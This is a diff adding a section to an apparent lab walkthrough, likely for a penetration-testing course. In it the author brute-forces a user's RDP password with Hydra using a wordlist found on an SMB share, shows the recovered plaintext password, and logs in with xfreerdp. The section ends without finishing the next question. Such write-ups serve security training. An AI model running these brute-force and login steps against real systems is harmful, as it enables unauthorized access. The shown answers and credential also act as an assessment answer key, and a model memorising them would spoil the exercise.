@@ -803,3 +803,38 @@ smb: \IT\Simon\> get random.txt
 getting file \IT\Simon\random.txt of size 94 as random.txt (2.6 KiloBytes/sec) (average 3.2 KiloBytes/sec)
 ```
 **So the answer for this question will be random.txt** 
+
+* **Enumerate the target and find a password for the user Fiona. What is her password?**
+
+From the previous enumeration, I obtained the creds.txt file from the Home share on the SMB server under the user fiona. I then attempted a brute force attack against the RDP service using Hydra with the following command:
+
+```bash
+hydra -l fiona -P creds.txt  rdp://10.129.203.10
+
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-28 13:35:32
+[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
+[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
+[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 7 login tries (l:1/p:7), ~2 tries per task
+[DATA] attacking rdp://10.129.203.10:3389/
+[3389][rdp] host: 10.129.203.10   login: fiona   password: 48Ns72!bns74@S84NNNSl
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-28 13:35:33
+```
+* **Once logged in, what other user can we compromise to gain admin privileges?**
+  
+After successfully obtaining the password for fiona, I attempted to access the RDP service using the following command:
+```bash
+xfreerdp /u:fiona /p:'48Ns72!bns74@S84NNNSl' /v:10.129.203.10
+```
+This command allowed me to connect to the remote desktop of the machine at 10.129.203.10 using the credentials I had discovered.
+
+
+
+
+
+
+
+
